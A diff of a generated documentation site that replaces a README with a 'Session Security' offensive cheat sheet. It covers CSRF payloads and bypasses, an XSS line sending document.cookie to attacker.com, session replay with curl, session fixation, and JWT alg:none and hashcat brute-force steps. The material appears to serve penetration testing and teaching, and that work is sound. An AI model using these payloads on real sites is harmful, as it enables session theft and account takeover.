@@ -165,7 +165,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#readme" class="md-skip">
+        <a href="#session-security" class="md-skip">
           Skip to content
         </a>
       
@@ -1331,6 +1331,24 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Session Security
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -1347,6 +1365,80 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#csrf-cross-site-request-forgery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CSRF (Cross-Site Request Forgery)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session Hijacking
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cookie-attributes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cookie Attributes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-fixation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session Fixation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        JWT Attacks
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -2841,6 +2933,69 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#csrf-cross-site-request-forgery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CSRF (Cross-Site Request Forgery)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session Hijacking
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cookie-attributes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cookie Attributes
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session-fixation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Session Fixation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#jwt-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        JWT Attacks
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -2859,7 +3014,84 @@
   
 
 
-<h1 id="readme">README<a class="headerlink" href="#readme" title="Permanent link">&para;</a></h1>
+<h1 id="session-security">Session Security<a class="headerlink" href="#session-security" title="Permanent link">&para;</a></h1>
+<p>Session management vulnerabilities allow attackers to steal, forge, or hijack user sessions — leading to account takeover.</p>
+<h2 id="csrf-cross-site-request-forgery">CSRF (Cross-Site Request Forgery)<a class="headerlink" href="#csrf-cross-site-request-forgery" title="Permanent link">&para;</a></h2>
+<p>Tricks authenticated users into submitting malicious requests to a target site.</p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cm">&lt;!-- Victim visits attacker page, triggers request to bank --&gt;</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://bank.com/transfer?to=attacker&amp;amount=1000&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="cm">&lt;!-- Form-based CSRF --&gt;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://target.com/change-email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;attacker@evil.com&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p><strong>Bypass CSRF protections:</strong>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>- Remove CSRF token entirely → may still work
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>- Use another user&#39;s valid CSRF token (if not tied to session)
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>- Change request method: POST → GET
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>- Change Content-Type: application/json → text/plain
+</span></code></pre></div></p>
+<h2 id="session-hijacking">Session Hijacking<a class="headerlink" href="#session-hijacking" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Steal session cookie via XSS</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>&lt;script&gt;document.location<span class="o">=</span><span class="s1">&#39;http://attacker.com/?c=&#39;</span>+document.cookie&lt;/script&gt;
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="c1"># Set stolen cookie in browser</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>document.cookie<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;PHPSESSID=stolen_value; path=/&quot;</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c1"># Or use curl</span>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>curl<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;PHPSESSID=stolen_value&quot;</span><span class="w"> </span>http://target.com/profile
+</span></code></pre></div>
+<h2 id="cookie-attributes">Cookie Attributes<a class="headerlink" href="#cookie-attributes" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Bypass Risk</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>No <code>HttpOnly</code></td>
+<td>Cookie readable via <code>document.cookie</code> (XSS can steal it)</td>
+</tr>
+<tr>
+<td>No <code>Secure</code></td>
+<td>Cookie transmitted over HTTP (MitM can steal it)</td>
+</tr>
+<tr>
+<td>No <code>SameSite</code></td>
+<td>Cookie sent cross-site (CSRF works)</td>
+</tr>
+<tr>
+<td><code>SameSite=Lax</code></td>
+<td>Only blocks cross-site POST CSRF</td>
+</tr>
+<tr>
+<td><code>SameSite=Strict</code></td>
+<td>Full protection against CSRF</td>
+</tr>
+</tbody>
+</table>
+<h2 id="session-fixation">Session Fixation<a class="headerlink" href="#session-fixation" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>1. Attacker obtains a valid session ID (e.g., unauthenticated)
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>2. Tricks victim into using that session ID
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>3. Victim authenticates — if server doesn&#39;t regenerate session, attacker owns it
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>Detection: is session ID the same before and after login?
+</span></code></pre></div>
+<h2 id="jwt-attacks">JWT Attacks<a class="headerlink" href="#jwt-attacks" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Decode</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;import base64; print(base64.b64decode(&#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9&#39; + &#39;==&#39;).decode())&quot;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="c1"># Test alg:none</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="nv">header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="s2">&quot;alg&quot;</span>:<span class="s2">&quot;none&quot;</span>,<span class="s2">&quot;typ&quot;</span>:<span class="s2">&quot;JWT&quot;</span><span class="o">}</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="c1"># Create token with empty signature: header.payload.</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="c1"># Test weak secret brute force</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>hashcat<span class="w"> </span>-a<span class="w"> </span><span class="m">0</span><span class="w"> </span>-m<span class="w"> </span><span class="m">16500</span><span class="w"> </span>token.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</span></code></pre></div>
 
 
 
